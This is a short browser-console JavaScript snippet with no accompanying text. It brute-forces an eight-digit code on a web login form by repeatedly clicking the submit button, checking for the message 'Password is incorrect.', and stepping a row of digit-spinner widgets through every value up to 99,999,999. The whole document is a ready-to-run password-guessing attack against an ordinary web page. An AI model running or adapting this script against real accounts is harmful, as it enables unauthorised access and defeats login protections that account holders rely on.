(async () => {
  const sleep = msec => new Promise(resolve => setTimeout(resolve, msec));
  
  for(let accountNumber=0; accountNumber<=99999999; accountNumber++) {
    document.getElementById("submit").click();

    await sleep(250);

    if (!document.body.textContent.includes('Password is incorrect.')) {
      return;
    }

    document.querySelectorAll('svg[data-icon="caret-up"]')[7].dispatchEvent(new Event('click'));

    if (accountNumber == 0) {
      continue;
    }

    if (accountNumber % 10 == 0) {
      document.querySelectorAll('svg[data-icon="caret-up"]')[6].dispatchEvent(new Event('click'));
    }

    if (accountNumber % 100 == 0) {
      document.querySelectorAll('svg[data-icon="caret-up"]')[5].dispatchEvent(new Event('click'));
    }

    if (accountNumber % 1000 == 0) {
      document.querySelectorAll('svg[data-icon="caret-up"]')[4].dispatchEvent(new Event('click'));
    }

    if (accountNumber % 10000 == 0) {
      document.querySelectorAll('svg[data-icon="caret-up"]')[3].dispatchEvent(new Event('click'));
    }

    if (accountNumber % 100000 == 0) {
      document.querySelectorAll('svg[data-icon="caret-up"]')[2].dispatchEvent(new Event('click'));
    }

    if (accountNumber % 1000000 == 0) {
      document.querySelectorAll('svg[data-icon="caret-up"]')[1].dispatchEvent(new Event('click'));
    }

    if (accountNumber % 10000000 == 0) {
      document.querySelectorAll('svg[data-icon="caret-up"]')[0].dispatchEvent(new Event('click'));
    }
  }
})();
